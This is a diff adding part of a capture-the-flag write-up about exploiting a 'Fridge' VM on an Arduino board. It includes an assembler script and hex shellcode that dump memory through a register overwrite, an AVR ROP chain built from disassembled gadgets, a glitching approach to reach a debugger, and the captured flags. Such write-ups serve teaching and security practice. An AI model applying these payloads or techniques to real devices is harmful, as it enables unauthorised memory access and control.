@@ -491,6 +491,217 @@ The XOR opcode is encoded as follows: ```0a<r1><r2>```, for example ```0a25``` m
 The memory layout is as follows:
 
 ```
-0x059a = r0
+0x59a = r0
+0x59e = r1
+0x5a2 = r2
+0x5a6 = r3
+0x5aa = r4
+0x5ae = r5
+0x5b2 = r6
+0x5b6 = r7
+0x5ba = r8 = base address for MOV r, [address]
+```
 
+So by writing to r8 we can overwrite the base address for VM memory access. After changing this base address we can read and write arbitrary memory using the MOV r, [address] and MOV [address], r instructions.
+
+In order to work with the Fridge architecture in a more efficient way I wrote a [small assembler](asm.py) that can be used to craft shellcode.
+
+Using this assembler we can write shellcode that dumps the entire memory by setting the base address pointer to 0, dumping 0x100 bytes and then increasing the base address pointer by 0x100.
+
+```
+from asm import *
+r = ""
+r += mov(r5,r8)
+# r5 now contains the base address
+r += label('inc_mem_base',r)
+r += xor(r4,r4)
+r += movh(r4,0x1)
+r += add(r5,r4)
+r += xor(r8,r8)
+r += xor(r8,r5)
+
+r += xor(r1,r1)
+r += movl(r1,0x100)
+r += xor(r3,r3)
+r += xor(r4,r4)
+r += movl(r4,1)
+r += label('dump',r)
+r += lodsb(r2,r3)
+r += write(r2)
+r += add(r3,r4) # r3 += 1
+r += cmp(r3,r1) # 0x100
+r += jnz('dump')
+r += jmp('inc_mem_base')
+print r
+```
+
+When we run this we obtain the following shellcode:
+```
+035800000a440540000108540a880a850a11041001000a330a4404400001000006231c2008341631180008140001
+```
+
+When we run this on the board we get the flag:
+
+```
+FLAG:67e0d654a05ee5533e8d57e9e53f3bb9
+```
+
+
+# Exploit 400 - Weird Machine
+
+The following description is given for this challenge:
+
+```
+Damn fridges. It seems there is no end to the problems they bring. And this time time it got even more difficult. I guess you already know in which direction this goes, right?
+```
+
+Given that this challenge is in the category exploitation it seems likely that we need to use the vulnerabilities found in the previous step to gain full code execution outside of the VM.
+
+We already have a 'read memory' and 'write memory' gadget so this should not be so hard. In order to achieve this we need to know some specifics about the AVR architecture:
+
+* Program memory and SRAM are separated and accessed using different instructions.
+* It is not possible to execute code from SRAM, code can only be executed from Flash memory.
+* All registers are memory mapped into SRAM, see [Wikipedia](https://en.wikipedia.org/wiki/Atmel_AVR_instruction_set#Addressing) for mapping details.
+
+Since code can only be executed from flash and not from SRAM the only option left to use is using ROP.
+
+The idea is as follows:
+
+* Write a ROP chain somewhere in memory
+* Overwrite the stack pointer (SP) using it's memory mapped location 0x5D using the virtual MOV instruction
+* The RET instruction in the virtual MOV instruction handler will now jump into the ROP chain.
+* Find some gadgets to dump what we need: Flash, SRAM and EEPROM to see where the flag is hidden.
+
+One of the issues we are left with is that we don't have the binary so it will be hard to find any gadgets. However we do have the binary for the 'FridgeJIT' challenge which is likely to be very similar.
+
+Let's start by making a ROP chain using the FridgeJIT binary and see if we can port it to the actual challenge later.
+
+We can find the following gadgets that are useful to dump SRAM and Flash:
+
+```
+print_string_addr_r24_from_ram
+     47c:       cf 93           push    r28
+     47e:       df 93           push    r29
+     480:       ec 01           movw    r28, r24
+     482:       89 91           ld      r24, Y+
+     484:       88 23           and     r24, r24
+     486:       19 f0           breq    .+6     ;  0x48e
+     488:       0e 94 df 01     call    0x3be   ;  serial_print char r24
+     48c:       fa cf           rjmp    .-12    ;  0x482
+     48e:       df 91           pop     r29
+     490:       cf 91           pop     r28
+     492:       08 95           ret
+
+print_string_addr_r24_from_flash
+     494:       cf 93           push    r28
+     496:       df 93           push    r29
+     498:       fc 01           movw    r30, r24
+     49a:       84 91           lpm     r24, Z
+     49c:       ef 01           movw    r28, r30
+     49e:       21 96           adiw    r28, 0x01   
+     4a0:       88 23           and     r24, r24
+     4a2:       21 f0           breq    .+8     ;  0x4ac
+     4a4:       0e 94 df 01     call    0x3be   ;  serial_print char r24
+     4a8:       fe 01           movw    r30, r28
+     4aa:       f7 cf           rjmp    .-18    ;  0x49a
+     4ac:       df 91           pop     r29
+     4ae:       cf 91           pop     r28
+     4b0:       08 95           ret
+
+movw_r24_r16_pop_4
+     4ea:       c8 01           movw    r24, r16
+     4ec:       df 91           pop     r29
+     4ee:       cf 91           pop     r28
+     4f0:       1f 91           pop     r17
+     4f2:       0f 91           pop     r16
+     4f4:       08 95           ret
+     
+pop_r17_r16:
+     4f0:       1f 91           pop     r17
+     4f2:       0f 91           pop     r16
+     4f4:       08 95           ret
+```
+
+These can be turned into a ROP chain as follows:
+
+```
+chain = [
+         pop_r17_r16, # Read word r16:r17 from next value in chain
+         swap(addr+len(dmp)), # Byte swapped version of the address we want to read
+         movw_r24_r16_pop_4, # Load word r24:r25 from r16:r17
+         0xdead, # consumed by pop_4
+         0xbeef, # consumed by pop_4
+         print_string_addr_r24_from_ram # Call print string at r24:r25 from SRAM
+         ]
+```
+
+This ROP chain works fine in gdb using the firmware provided. The last trick that I found out after hours of head breaking is that the gadgets have shifted by 18 words in the weird machine binary compared to the fridge_jit one.
+
+Once we factor that offset of 18 into the address [the exploit](weird_machine.py) works and dumps the flag from address 0x700.
+
+```
+Connecting...
+00000000: 46 4C 41 47 3A 32 39 32  61 33 62 64 64 39 34 35  FLAG:292a3bdd945
+00000010: 32 34 33 62 30 35 36 30  32 32 63 34 31 63 39 38  243b056022c41c98
+00000020: 37 33 35 65 99 00                                 735e..
+```
+
+I used this same exploit to dump the Flash, which worked fine but unfortunately it is not possible to read the bootloader this way since the bootloader cannot be read using the LPM instruction from outside of the bootloader :(
+
+# Fault injection 300 - Revenge
+
+The following description is given for this challenge:
+
+```
+The same manager that last time demanded field upgradable software is now asking the development team for an explanation as to why so many users have been able to hack their own fridge. The manager is also asking the legal department if they could sue every single user, but they responded that users are free to do as they want with their own equipment.
+
+This is not acceptable, so the manager threatens to fire everybody unless they solve this major issue before coming Monday. How they resolve it is up to them, as long as it is sorted in the given time frame.
+
+But is the solution sufficient?
+
+Keep in mind that FI can be risky. If you brick your Arduino the game is over. Hence, you should try this challenge after you are done with the other challenges.
+```
+
+What has changed from before is that now each program includes some sort of a signature making it no longer possible to run our own programs without obtaining a valid signature.
+
+There is one example program with a valid signature provided that we can use to at least run something on the board.
+
+I first tried for quite a while to glitch the board into accepting an invalid signature but had no luck with this.
+
+I had success very quickly when I switched to another technique using something I had seen in the previous fridge challenges: some errors during execution cause the program to drop into a 'FridgeJIT debugger' that can be used to single step the program and load new firmware.
+
+I wrote a [small Arduino program to do the glitching](arduino_glitch_revenge.c) which basically sends the valid program to the board waits a while until the program is running and then sends some glitches, hoping to drop into the debugger.
+
+Running this for a few minutes indeed dropped me into the debugger:
+
+```
+Oops!
+[ FridgeJIT Console ]
+>>
+>>
+>>
+```
+
+Now the only thing left is to run something from the debugger. I used a payload similar to that of hide and seek to dump the flag from SRAM at location 0x700 where it also was in all previous parts of this challenge.
+
+```
+Oops!
+[ FridgeJIT Console ]
+>>
+>>
+>> l
+Loader> 05000007040000000a880a800a11041001000a220a4404400001000006321c3008241621180007
+
+[ FridgeJIT Console ]
+
+/---------------------------------\   /---------------------------\
+| >> 0000: 05000007 MOVH r0 #0007 |   | R0: 00000000 R4: 00000000 |
+|    0004: 04000000 MOVL r0 #0000 |   | R1: 00000000 R5: 00000000 |
+|    0008: 0a88     XOR r0 r0     |   | R2: 00000000 SP: 00000100 |
+|    000a: 0a80     XOR r0 r0     |   | R3: 00000000 IP: 00000000 |
+|    000c: 0a11     XOR r1 r1     |   | Z:  0        C:  0        |
+\---------------------------------/   \---------------------------/
+
+>> e
+FLAG:9fd67981eb653dfc03c654ac0f05ff
 ```
